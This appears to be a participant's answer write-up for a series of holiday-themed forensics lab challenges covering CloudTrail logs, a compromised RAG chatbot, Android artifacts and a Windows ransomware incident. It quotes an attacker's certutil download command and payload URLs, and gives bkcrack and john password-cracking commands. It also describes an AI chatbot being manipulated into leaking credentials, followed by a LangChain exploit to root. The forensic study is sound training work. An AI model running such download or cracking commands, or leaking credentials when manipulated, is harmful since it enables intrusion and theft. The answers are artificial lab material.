## Task 1

Q: The Victim Elf shared credentials that allowed the Rogue Elf to access the workstation. What was the Client ID that was shared?

`95192516` - after digging into the CloudTrail logs and some of the edge history, I've noticed in %LOCALAPPDATA% for the Lanny user that there's the IceChat Network folder, which has some logs from some IRC chat. Looking at the logs from the chats (the actual chats themselves), we get an interesting interaction with the W4yne user.

## Task 2

`146.70.202.35` - from same log as above

## Task 3

Q: What is the name of the executable the victim ran to enable remote access to their system?

`AA_V3.EXE` - from the Edge DB for Lanny, I saw as downloads some AA_V3.exe file (`History` file), so I looked further, and saw in `urls` the amyy admin zero-config remote desktop, and thus tried it and it worked

## Task 4

Q: What time (UTC) did the Rogue Elf connect to the victim's workstation?

`2024-11-13 12:23:34` - get the date from the Ammyy logs, since we know this was used, but you'll have to fiddle with the timezone until you get it right

## Task 5

Q: The Rogue Elf compromised an AWS Access Key. What is the AWS Access Key ID obtained from the victim's workstation?

`AKIA52GPOBQCBFYGAYHI` - since we knew the key started with AK, I gathered all CloudTrail logs into one and searched for the key format (`AKIA[A-Z0-9]{16}` in the logs corresponding to similar times when the computer was compromised)

## Task 6

Q: Which S3 bucket did the Rogue Elf target during the incident?

## Task 10

Q: What time (UTC) was the first restore operation successfully initiated for the S3 objects?

`2024-11-13 15:43:49` - search for RestoreObject event and ensure there are no errors there (ensure the correct access key is used)

## Task 11

Q: Which retrieval option did the Rogue Elf use to restore the S3 objects?

`Expedited` - get the restore options from the same log as before

## Task 12

Q: What is the filename of the S3 object that the Rogue Elf attempted to delete?

`GiftList_Worldwide.csv` - search for DeleteObjects events (ensure the correct access key is used) and get the key from there

## Task 13

Q: What is the size (MB) of the S3 object that the Rogue Elf targeted in Question 12?

`152` - see that there are multiple GetObject requests for our file, and just sum those up and try multiples of 8 until one works

## Task 14

Q: The Rogue Elf uploaded corrupted files to the S3 bucket. What time (UTC) was the first object replaced during the attack?

`2024-11-13 16:10:03` - search for PutObject events (with the given key) and get the earliest occurence

# OpTinselTrace24-3: Neural Noel

## Task 1

Q: What username did the attacker query the AI chatbot to check for its existence?

`Juliet` - open the given PCAP, and filter for HTTP traffic (observe first that the chatbot talk is done via HTTP, and filter for that) to /rag-chatbot/

## Task 2

Q: What is the name of the AI chatbot that the attacker unsuccessfully attempted to manipulate into revealing data stored on its server?

`GDPR Chatbot` - check the result of the request to `/chat` for any chatbot, and look at the HTML returned, it has a list of all the chatbot names, and use the appropriate one based on the conversations there

## Task 3

Q: On which server technology is the AI chatbot running?

`Werkzeug/3.1.3 Python/3.12.7` - get user agent of requests

## Task 4

## Task 6

Q: What time did the attacker use the exposed credentials to log in?

`06:49:44` - get the username and password sent by the AI chatbot, and then check `auth.log` for the first successful login notification given that `noel` username

## Task 7

Q: Which CVE was exploited by the attacker to escalate privileges?

`CVE-2023-44467` - from `history`, we can assume that the AI is using `langchain 0.0.14`, thus we search for CVEs for that, and end up with this one, which is exactly matching our case, as it uses `__import__`

## Task 8

Q: Which function in the Python library led to the exploitation of the above vulnerability?

`__import__` - given the execution logs in `history` and the format of the answer, it was a fair guess

## Task 9

Q: What time did the attacker successfully execute commands with root privileges?

`06:56:41` - get this from `auth.log`, by seeing the first occurence of a shell spawned by `noel` that resulted in a `root` shell


# OpTinselTrace24-5: Tale of Maple Syrup


## Task 1

Q: Identifying IOCs, accounts, or infrastructure is crucial for detecting breaches by attackers. Determine the email address used by the threat actor so it can be added to Santa's threat intel feed.

`krampusevilson@yahoo.com` - do the second one first, and then search the databases in the app's folder, eventually one of them will give the email

## Task 2

Q: Which application was used by the insider threat to communicate with the threat actor? Please provide the application's Android package name.

`mega.privacy.android.app` - seems to be the only package with that given name hint

## Task 3

Q: When was this application installed on the device?

`2024-11-04 11:24:28` - last question I did, since the timestamps didn't match anything. I tried matching stuff from dbs and creation date of almost all files related to that app, but to no avail
I spent some time searching for some analysis tools, and ended up at `https://github.com/abrignoni/ALEAPP`
Running the tool gave some errors, but I looked at what it queried to get the installed app, and it looked at some `localappstate.db`, so I opened that and got the timestamp from there and it worked

## Task 4

Q: What is the agreed amount of money to be sent to the insider threat in exchange of him leaking Santa workshop's secrets?

`$69000` - check the messages from the email db

## Task 5

`I will need to find any ssh or rdp access that is open to internet. Will need to find their email address as well, maybe krampus will need those as well!!` - observe the `com.google.android.keep` package as the note-keeping app, and then search the databases in the databases folder 

## Task 6

Q: What is the title of this note?

`Collect Information` - search that same DB for other tables and get the title (`tree_entry` table)

## Task 7

Q: When was the note created in the note-keeping app?

`2024-11-04 12:14:55` - same table as before

## Task 8

Q: Twinkle Snowberry transferred a few files from his workstation to his mobile phone using an online file transfer service. What is the URL used to download the zip file on the mobile phone?

`https://eu.justbeamit.com:8443/download?token=um9w7` - check firefox databases related to downloads

## Task 9

Q: When was this file shared with the threat actor by the insider, Twinkle Snowberry?

`2024-11-05 12:04:24` - get timestamp of message from the initial DB

## Task 10

Q: Twinkle forgot the password of the archive file he sent to Krampus containing secrets. What was the password for the file?

`passdrow69#` - hah, this was hard
You'll have to pay attention to the encryption method that was used, namely ZipCrypto. I tried bruteforcing for a while with data from various databases from within the app, but to no avail. Then, I started searching for attacks against ZipCrypto, and ended up with this website: `https://blog.devolutions.net/2020/08/why-you-should-never-use-zipcrypto/` (talks about a known plaintext attack). This might work since we know part of the plaintext (we know the insider's email from the initial  DB, and we know that in that encrypted archive there's a list of emails, from that same convo). By creating a test plain.txt file with the known email (`TwinkleSnowberry@north.pole`), zipping it with ZipCrypto method and no password, then running `bkcrack.exe -C "info-send(1).zip" -c Emails.txt -P plain.zip -p plain.txt`, we get some keys. We can then recover the password via `bkcrack.exe -k cec26f80 cc8751a0 fdf67470 -r 11 ?p` or decrypt files from within with `bkcrack.exe -C "info-send(1).zip" -c Emails.txt -k cec26f80 cc8751a0 fdf67470 -d Emails.txt`.
 
## Task 11

Q: What is the master password of the KeePass database that was leaked by the insider threat and handed over to the evil Krampus?

`weed420` - run john on the decrypted .kdbx file with rockyou.txt

## Task 12

Q: What is the password for Santa's account on his North Pole workstation?

`IHaveToSaveChristmas!$` - browse the now decrypted keepass database and obtain the windows password

## Task 13

Q: Twinkle got his money in cryptocurrency so it can't be traced. Which cryptocurrency did he receive money in, and what was its address?

`Elfereum:LVg2kJoFNg45Nbpy53h7Fe1wKyeNJHeXV2` - from the initial DB with the email


# OpTinselTrace24-6: Sleigh Slayer


## Task 1

Q: What is the hostname from which the attacker laterally moved to Santa's computer?

`NORTHPOLE-TOYSQ` - search for event ID 4624 (successful logon) in Security.evtx, and look at the WorkstationName in the networking part (I used EvtxEcmd to parse all to csv and got all workstation names)

## Task 2

Q: The attacker navigated the file share in hopes of finding useful files. What is the file share path for something planned for Christmas Eve?

`\\NORTHPOLE-FS\fileshare\kitchen-prep\cristmas-eve-PRIORITY\` - looked into %APPDATA%\Microsoft\Windows\Recent and analyzed the shortcuts there, then found this

## Task 4

Q: When did the attacker visit this share?

`2024-12-10 10:41:40` - use shellbags for the santa user

## Task 5

Q: What is the filename of the file related to complaints from a department? The attacker found this on the share and also added it to the archive to exfiltrate.

`toys-dept.txt` - check other LNKs from the share location

## Task 6

Q: Windows Defender detected and stopped the first attempt of the attacker to download a file from their infrastructure. What is the full command that was executed by the attacker, which Defender detected and stopped?

`C:\Windows\System32\certutil.exe -urlcache -f http://3.110.162.216:8175/OpXmasDestroy/Collection/package.exe
` - check Windows Defender event logs

## Task 7

Q: The attacker proceeded to disable Windows real-time protection in order to evade defenses. When did this activity occur?

`2024-12-10 10:44:10` - from same logs as above

## Task 8

Q: The attacker copied a file and moved it from one location to another using 7zip. What is the full path where this file was moved to?

`C:\Users\Public\scan\` - from NTUSER.DAT registry hive, in 7z registry we have CopyHistory, which has this directory

## Task 9

Q: The attacker also enumerated a zip file using 7zip on Santa's desktop. What is the path of the folder related to the Christmas bonus present inside that zip?

`C:\Users\santa\Desktop\finance_christmas.zip\finance_christmas\Employees\performance_bonus_24\` - browse the same registry key as above and look at FolderHistory

## Task 10

Q: What was the name of the archive file created by 7zip?

`scan87x.zip` - from LNK in Recent files

## Task 11

Q: The attacker installed 7zip on the system and added some files to be archived. What was the last filesystem path visited by Krampus?

`C:\Program Files (x86)\WindowsPowerShell\Configuration\Registration` - same registry key as Task 9, just get the first folder in that list

## Task 12

Q: The attacker downloaded installers from their infrastructure for data exfiltration and collection. What is the full download URL for the tool used for exfiltration?

`http://3.110.162.216:8175/OpXmasDestroy/exfil/Godzilla.exe` - check CryptnetUrlCache metadata files for URLs

## Task 13

Q: What is the name of the tool used for exfiltration?

`Filezilla` - check the content folder now for the same file name as you found in metadata from the task above

## Task 14

Q: The attacker renamed the zip before exfiltrating it. What was the name changed to?

`transfer_scanned.zip` - jumplists from AutomaticDestionations from Recent files, same place as the initial shortcuts, search for .zip files there and you'll get that one

## Task 15

Q: What is the set of credentials used by Krampus to exfiltrate data to his server?

`krampus:ihavetodestroychristmasxoxo` - lmao, did this first, I started looking through the data and noticed the filezilla data in %APPDATA% for the santa user, found a password so I looked for matching questions, and this was it

## Task 16

Q: Determine the full path where the files from Santa's computer were exfiltrated and stored on Krampus's server.

`/home/krampus/ChristmasOP/santaloot` - from filezilla logs in %APPDATA%

## Task 17

Q: Krampus then proceeded to download ransomware on the system. What is the SHA-256 hash of the executable?

`808f098b303d6143e317dd8dae9e67ac8d2bcb445427d221aa9ad838aa150de3` - do the URL first (task 18) and then get the file from Content

## Task 18

Q: What is the full download URL for the ransomware file?

`http://3.109.152.7/final_operation/destroyer.zip` - same as for the FileZilla, find the metadata file

## Task 19

Q: When was the ransomware binary executed according to prefetch?

`2024-12-10 11:06:30` - use PEcmd and get the last run time

## Task 20

Q: Reverse engineer the ransomware. What was the IV used for encryption?

`8d2bc3f0f69426gd` - so, by analyzing the EXE given, we see that it seems to be legitimate, and just a NodeJS runner for compiled code
thus, we shift our focus to the given .JSC file we have, I tried a bit to see how we can do it, and ended up with this project `https://github.com/suleram/View8`
so we use that to decompile the code and get some source code, and we can see that the key and iv are generated from a base64 string, which are then xorred with `C:/Users/Public/file.txt`, so just decode the base64 and xor it with the given string to get the actual key and IV

## Task 21

Q: What was the Key used for encryption?

`REtgV24bDB7xWYoMuypiBASMEaJbc59n` - this was hard, js shenanigans af
so, basically the length check for the key in the XOR function is off by one (it checks if ("j" < a1["length"]), instead of length - 1), and that makes it access 1 byte after the buffer, which is typically \x00
but then, the lookup table used initially has values starting from 1, and accessing it at 0 is another overflow, thus we get another \x00 possibly

I just had a simple XOR script and made it that when it is the length of the key (24), we xor with 0 instead of accessing out of bounds buffers.

## Task 22

Q: Decrypt the encrypted files and find the name of the extra naughty kid.

`Tenzin` - decrypt the naughty kids pdf (beware that the encrypted file is given in hex form, and you have to take those bytes and decrypt it, and then base64 decode)

## Task 23

Q: Decrypt the encrypted files and find the name of the employee getting a promotion and salary increment.

`SparkleSugarglow` - same as task 22

## Task 24

Q: When did the threat actor log off?

`2024-12-10 11:10:19` - search Security event logs and look for logoff events (4634, 4637)
